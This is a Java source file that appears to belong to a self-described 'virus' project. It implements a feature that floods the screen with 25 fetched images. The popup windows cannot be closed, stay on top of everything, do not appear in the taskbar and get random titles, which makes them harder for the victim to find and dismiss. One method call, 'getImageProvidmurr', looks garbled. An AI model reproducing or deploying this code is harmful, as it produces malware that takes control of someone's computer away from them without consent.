package me.bannock.virus.features.impl;

import me.bannock.virus.features.Feature;
import me.bannock.virus.images.ImageProviderService;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.List;

public class FeatPopupImages extends Feature {

    @Override
    public void run() {
        if (!config.shouldPopupImages())
            return;

        final ImageProviderService imageProviderService = config.getImageProvidmurr();

        List<String> images = imageProviderService.fetchImages(25);
        // Gets the size of the screen
        int screenWidth = (int) java.awt.Toolkit.getDefaultToolkit().getScreenSize().getWidth();
        // Create new popups
        new Thread(() -> {
            for (String url : images){

                // Loads image
                byte[] bytes = imageProviderService.fetchBytes(url);
                try (InputStream in = new ByteArrayInputStream(bytes)) {
                    BufferedImage image = ImageIO.read(in);

                    // Creates popup window
                    JFrame popup = new JFrame();
                    popup.setSize(image.getWidth(), image.getHeight()); // Set size to match image
                    popup.setUndecorated(true); // Remove title bar, borders, etc
                    popup.setAlwaysOnTop(true);
                    popup.setResizable(false);
                    JLabel imageLabel = new JLabel(); // Set the only content on the jframe to the image
                    imageLabel.setIcon(new ImageIcon(image));
                    popup.setContentPane(imageLabel);
                    popup.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE); // If the user closes the window then nothing happens
                    popup.setTitle(Long.toString(System.nanoTime(), Character.MAX_RADIX)); // Pseudorandom window title
                    popup.setFocusable(false); // Prevents the window from stealing focus
                    popup.setFocusableWindowState(false);
                    popup.setType(JFrame.Type.UTILITY); // Makes the window not show up in the taskbar

                    // Set the position of the window to a random point on screen, handles window size to not go off screen
                    popup.setLocation((int) (Math.random() * (screenWidth - popup.getWidth())),
                            (int) (Math.random() * (java.awt.Toolkit.getDefaultToolkit().getScreenSize().getHeight()
                                    - popup.getHeight())));
                    // Show the window
                    popup.setVisible(true);
                } catch (IOException ignored) {}
            }
        }).start();
    }
}
